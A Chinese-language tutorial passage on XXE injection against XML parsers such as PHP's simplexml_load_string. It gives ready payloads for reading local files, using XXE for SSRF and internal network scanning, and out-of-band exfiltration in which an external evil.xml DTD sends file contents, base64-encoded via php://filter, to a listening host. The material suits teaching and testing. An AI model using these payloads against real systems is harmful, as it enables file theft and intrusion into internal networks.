## **0x01:知识准备**



```
XXE即XML External Entity Injection，由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。例如PHP中的simplexml_load默认情况下会解析外部实体，有XXE漏洞的标志性函数为simplexml_load_string（）
```

XML实体分为四种：字符实体，命名实体，外部实体，参数实体

**1、命名实体写法：**

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "file:///c://test/1.txt" >]>        
<value>&xxe;</value>

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "http://otherhost/xxxx.php" >]>        
<value>&xxe;</value>
```

可以用做xxe+ssrf，用于内网扫描  
**2、命名实体+外部实体写法：**

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE root [
<!ENTITY dtd SYSTEM "http://localhost:88/evil.xml">
]> 
<value>&dtd;</value>
```

这种命名实体调用外部实体，发现evil.xml中不能定义实体，否则解析不了，感觉命名实体好鸡肋，参数实体就好用很多  
**3、第一种命名实体+外部实体+参数实体写法：**

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///c://test/1.txt">
<!ENTITY % dtd SYSTEM "http://localhost:88/evil.xml"> 
%dtd; %all; 
]> 
<value>&send;</value>
```

其中evil.xml文件内容为

```
<!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:88%file;'>">
```

调用过程为：参数实体dtd调用外部实体evil.xml，然后又调用参数实体all，接着调用命名实体send

**第二种命名实体+外部实体+参数实体写法：**

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=c:/test/1.txt">
<!ENTITY % dtd SYSTEM "http://localhost:88/evil.xml">
%dtd;
%send;
]>
<root></root>
```

其中evil.xml文件内容为：

```
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://localhost:88/?content=%file;'>"> %payload;
```

调用过程和第一种方法类似

